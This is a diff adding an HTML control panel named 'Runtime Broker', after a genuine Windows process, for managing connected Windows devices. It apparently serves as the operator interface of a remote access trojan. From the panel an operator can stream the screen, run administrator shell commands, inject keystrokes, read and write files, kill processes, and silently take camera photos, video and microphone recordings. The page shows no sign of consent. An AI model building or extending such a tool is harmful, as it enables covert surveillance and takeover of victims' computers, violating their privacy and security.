@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Runtime Broker</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="app">
+    <header class="topbar">
+      <div>
+        <div class="brand">Runtime Broker</div>
+        <div class="subtitle">Connected devices</div>
+      </div>
+      <div class="topbar-right" id="agentsHeader">Connecting...</div>
+    </header>
+
+    <main>
+      <section id="devicesPage" class="page">
+        <div class="page-head">
+          <div>
+            <h1>Devices</h1>
+            <p class="muted">Select a connected device to open its controls.</p>
+          </div>
+          <button class="icon-button" onclick="loadMonitor()" title="Refresh devices">↻</button>
+        </div>
+        <input type="text" id="deviceSearch" class="search-input" placeholder="Search devices" autocomplete="off">
+        <div class="muted summary" id="agentsSummary"></div>
+        <div id="deviceCards" class="device-list"></div>
+      </section>
+
+      <section id="devicePage" class="page" style="display:none;">
+        <div class="page-head">
+          <div>
+            <button class="back-button" onclick="showDevices()">← Devices</button>
+            <h1 id="deviceTitle">Device</h1>
+            <p class="muted" id="deviceMeta"></p>
+          </div>
+          <span id="deviceStatus" class="badge badge-resolved">Online</span>
+        </div>
+
+        <div class="action-grid">
+          <button class="action-card" onclick="openLive()"><span class="action-icon">◉</span><strong>Live Screen</strong><small>Stream the device screen</small></button>
+          <button class="action-card" onclick="captureMonitorNow()"><span class="action-icon">▣</span><strong>Screen Capture</strong><small>Take a screenshot</small></button>
+          <button class="action-card" onclick="focusTool('shellCommand')"><span class="action-icon">&gt;_</span><strong>Shell</strong><small>Run administrator commands</small></button>
+          <button class="action-card" onclick="focusTool('textCommand')"><span class="action-icon">T</span><strong>Input Text</strong><small>Type text on the device</small></button>
+          <button class="action-card" onclick="focusTool('paragraphCommand')"><span class="action-icon">¶</span><strong>Input Paragraph</strong><small>Type a paragraph</small></button>
+          <button class="action-card" onclick="runDeviceCommand('list_files',{path:'C:\\Windows\\System32'})"><span class="action-icon">□</span><strong>Files</strong><small>Browse remote files</small></button>
+          <button class="action-card" onclick="runDeviceCommand('list_processes')"><span class="action-icon">▤</span><strong>Processes</strong><small>View running processes</small></button>
+          <button class="action-card" onclick="runDeviceCommand('list_services')"><span class="action-icon">⚙</span><strong>Services</strong><small>View Windows services</small></button>
+          <button class="action-card" onclick="runDeviceCommand('camera_photo')"><span class="action-icon">◌</span><strong>Camera</strong><small>Capture a remote photo</small></button>
+          <button class="action-card" onclick="runDeviceCommand('mic_record',{seconds:10})"><span class="action-icon">●</span><strong>Microphone</strong><small>Record remote audio</small></button>
+          <button class="action-card" onclick="focusTool('commandName');$('commandName').value='play_audio'"><span class="action-icon">▶</span><strong>Play Audio</strong><small>Play audio on the device</small></button>
+          <button class="action-card" onclick="focusTool('commandName');$('commandName').value='transfer_file'"><span class="action-icon">⇄</span><strong>Transfer Files</strong><small>Send a file to the device</small></button>
+          <button class="action-card" onclick="focusTool('commandName');$('commandName').value='screen_rotate'"><span class="action-icon">⟳</span><strong>Screen Control</strong><small>Rotate the remote screen</small></button>
+          <button class="action-card" onclick="focusTool('commandName')"><span class="action-icon">⋮</span><strong>More Controls</strong><small>Advanced device actions</small></button>
+        </div>
+
+        <div id="toolPanel" class="tool-panel" style="display:none;">
+          <div class="panel-head"><h2>Command Console</h2><button class="icon-button" onclick="clearConsole()" title="Clear output">⌫</button></div>
+          <div class="console-grid">
+            <select id="commandName" class="search-input console-wide">
+              <option value="shell_exec">Shell command</option><option value="input_text">Input text</option><option value="input_mouse">Mouse input</option><option value="input_paragraph">Input paragraph</option><option value="screen_rotate">Rotate screen</option><option value="list_processes">Processes</option><option value="kill_process">Kill process</option><option value="list_services">Services</option><option value="service_action">Service action</option><option value="list_files">List files</option><option value="read_file">Read file</option><option value="write_file">Write file</option><option value="camera_video">Camera video</option><option value="mic_record">Microphone</option><option value="play_audio">Play audio</option><option value="stop_audio">Stop audio</option><option value="transfer_file">Transfer file</option><option value="stop_typing">Stop typing</option>
+            </select>
+            <button class="btn-primary" onclick="runGenericCommand()">Run</button>
+            <input id="shellCommand" class="search-input console-wide" placeholder="Administrator shell command">
+            <button class="btn-primary" onclick="runShell()">Send</button>
+            <input id="textCommand" class="search-input console-wide" placeholder="Text to type">
+            <button class="btn-primary" onclick="sendText()">Send</button>
+            <textarea id="paragraphCommand" class="search-input console-wide" rows="3" placeholder="Paragraph to type"></textarea>
+            <button class="btn-primary" onclick="sendParagraph()">Start</button>
+            <textarea id="commandParams" class="search-input console-wide" rows="2" placeholder="Advanced command parameters as JSON">{"command":"whoami","timeoutSec":120,"admin":true}</textarea>
+          </div>
+          <div class="console-actions"><button class="btn-muted" onclick="stopTyping()">Stop Typing</button><button class="btn-muted" onclick="stopAudio()">Stop Audio</button><button class="btn-danger" onclick="stopAll()">Stop Automation</button></div>
+          <pre id="consoleOutput" class="console-output"></pre>
+        </div>
+
+        <div id="liveWrap" class="live-wrap" style="display:none;"><div class="live-head"><strong>Live Screen</strong><button class="btn-muted" onclick="closeLive()">Close</button></div><img id="liveImg" alt="Live device screen"></div>
+        <div class="capture-panel"><div class="panel-head"><h2>Screen Capture</h2><div><button class="btn-primary" onclick="captureMonitorNow()">Capture</button><button class="btn-muted" onclick="copyMonitorImage()">Copy</button></div></div><div id="monitorCaptureInfo" class="muted">No capture yet</div><img id="monitorImg" style="display:none" alt="Screen capture"></div>
+      </section>
+    </main>
+  </div>
+  <script src="app.js"></script>
+</body>
+</html>
